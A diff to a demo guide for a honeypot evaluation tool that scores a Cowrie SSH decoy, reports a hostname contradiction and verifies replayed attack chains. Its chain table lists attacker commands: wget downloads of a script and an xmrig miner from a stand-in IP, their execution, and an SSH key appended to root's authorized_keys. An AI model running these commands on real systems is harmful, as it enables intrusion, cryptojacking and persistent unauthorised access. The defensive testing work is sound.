@@ -223,30 +223,70 @@ status          : completed        evaluator: unavailable      evaluatorModel: N
 agentModel      : deterministic-probes@1
 modules:
    nmap       completed
-   agent      error      Channel closed.
-   chains     error      Channel closed.
+   agent      completed
+   chains     completed
    tcpdump    error      [WinError 2] The system cannot find the file specified
 category scores:
-   basic_commands         det=None    eval=None
+   attack_possibilities   det=1.0     eval=None
+   basic_commands         det=1.0     eval=None
    context                det=None    eval=None
-   file_system            det=None    eval=None
-   sanity                 det=None    eval=None
+   file_system            det=1.0     eval=None
+   sanity                 det=0.667   eval=None
    services               det=0.667   eval=None
-probeResults: 12   chainSteps: 0   findings: 0
+probeResults: 12   chainSteps: 7   findings: 1
 ```
 
-**Three things to demonstrate here, and they are the whole point of the half:**
+### The finding — open this one
 
-1. **`None` is rendered as "not established", never as `0`.** Four characteristics could
-   not be measured because their module failed. They show words, not a zero. A rendered
-   `0.0` would look like a verdict against the honeypot; a null is a gap in what *we*
-   could measure.
-2. **`services` shows a real `0.667`** — two of three expected services found. That *is*
-   a verdict, and it renders as a number. Put it beside the nulls: the UI distinguishes
-   "we measured, and it scored 0.667" from "we could not measure".
-3. **Our own failure is never counted against the honeypot.** `agent` and `chains`
-   errored, and the facts they would have established are `unknown` — excluded from both
-   the numerator and the denominator, not scored as zero.
+The run produces a real, grounded finding:
+
+```
+[high] sanity (deterministic):
+   hostname_cmd and hostname_file disagree about host.name: 'med-ws-04' vs 'svr04'
+   evidence: two probe results
+```
+
+**The honeypot contradicts itself.** `hostname` answers `med-ws-04`; `cat /etc/hostname`
+answers `svr04`. Both probes establish the same canonical fact, so the contradiction is
+detected deterministically — no model involved — and the finding carries **two** evidence
+pointers, one per probe, each resolving to the recorded output that disagrees. That is a
+genuine realism defect an attacker could use to fingerprint the decoy, found automatically.
+
+### Chain verification
+
+Seven chain steps come back, each matched by a rulebook rule and each citing a real
+Cowrie event:
+
+```
+dropper         [0] wget http://198.51.100.7/malicious_script.sh   T1105      observed
+dropper         [1] chmod 777 malicious_script.sh                  T1222.002  observed
+dropper         [2] bash malicious_script.sh                       T1059.004  observed
+miner           [0] wget http://198.51.100.7/xmrig                 T1105      observed
+miner           [1] chmod 777 xmrig                                T1222.002  observed
+miner           [2] ./xmrig                                        T1496      observed
+ssh_persistence [0] echo ssh-rsa ... >> /root/.ssh/authorized_keys T1098.004  observed
+```
+
+**Click a chain step's event id.** It resolves to the real captured event — the same
+`/api/events/{id}` path the Log Explorer uses. This is the provenance demo from §3, but
+for the evaluation half: the honeypot was attacked, the attack was recognised by the same
+rulebook that classifies real intrusions, and the claim points at the log line proving it.
+
+**Four things to demonstrate here, and they are the whole point of the half:**
+
+1. **`context` is `None`, rendered as "not established", never as `0`.** Its module
+   (`tcpdump`) is not installed on this host, so the facts are `unknown`. It shows words,
+   not a zero. A rendered `0.0` would look like a verdict against the honeypot; a null is
+   a gap in what *we* could measure.
+2. **`sanity` and `services` show real fractions** — `0.667` each, two of three. Those
+   *are* verdicts, and they render as numbers. Put them beside the null: the UI
+   distinguishes "we measured, and it scored 0.667" from "we could not measure".
+3. **Our own failure is never counted against the honeypot.** `tcpdump` errored, and the
+   facts it would have established are `unknown` — excluded from both the numerator and
+   the denominator, not scored as zero.
+4. **`sanity` scoring 0.667 is the honeypot's own defect**, not ours: two of three sanity
+   probes agreed, one pair contradicted. That is the difference between a measurement and
+   an absence, visible in the same table.
 
 Also worth naming: **`agentModel` is `deterministic-probes@1`, not a model name.** The
 probe agent is Paramiko plus a fixed probe list — no model drives it — so naming one
@@ -312,32 +352,18 @@ Restore with `mv .env.bak .env`.
 
 Be upfront about these rather than being surprised.
 
-### Cowrie refuses `exec` channels — the agent and chains will error
-
-This is the one real functional gap. Verified directly against the running container:
-
-```
-exec_command("uname -a")        -> SSHException: Channel closed.
-raw open_session + exec_command -> SSHException: Channel closed.
-invoke_shell()                  -> works, returns:
-    Linux med-ws-04 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 x86_64 GNU/Linux
-    root@med-ws-04:~#
-```
-
-Both the probe agent and the chain replayer use `exec_command`, so a live evaluation
-returns `agent: error` / `chains: error` and produces **no chain steps and no findings**.
-The interactive shell works perfectly, so the fix is to drive `invoke_shell` instead —
-it is a known, scoped change, not a mystery.
-
-**Consequence for the demo:** you cannot currently show a chain step's event id opening a
-real Cowrie event on live data. Use demo mode (§6) to show a resolved citation, and say
-plainly that the live agent path is blocked on this.
-
 ### `EVALUATION_TARGET_HOST` defaults to `cowrie`
 
 That is the compose service name and does **not** resolve from a backend running on the
 host — you get `getaddrinfo failed` and even nmap reports nothing. Start the backend with
 `EVALUATION_TARGET_HOST=127.0.0.1` as §0 shows.
+
+This one is worth knowing for a second reason. The honeypot is reached through a
+*published container port*, so Docker re-originates the connection and Cowrie records the
+proxy's source port, not ours — we open from one port and Cowrie logs another. Chain
+verification therefore scopes its read-back on Cowrie's own `session.id`, discovered via a
+per-session nonce the agent writes, rather than on the port. If you see chains time out
+with "commands were not indexed", that correlation is where to look.
 
 ### `tcpdump` is absent on Windows
 
@@ -366,7 +392,9 @@ If you are short on time, this is the spine:
 3. Expand an indicator's evidence → the real log line. **This is the project's thesis.**
 4. `/mitre` — observed vs inferred, rendered differently.
 5. `/evaluation` → **Run evaluation** → 202 in ~2 s, then the two assessments side by
-   side, with nulls as "not established" beside a real `0.667`.
+   side, with `context` as "not established" beside a real `0.667`.
+6. Open the sanity finding — the honeypot disagrees with itself about its own hostname —
+   and a chain step's event id, which resolves to the real captured command.
 
 ---
 
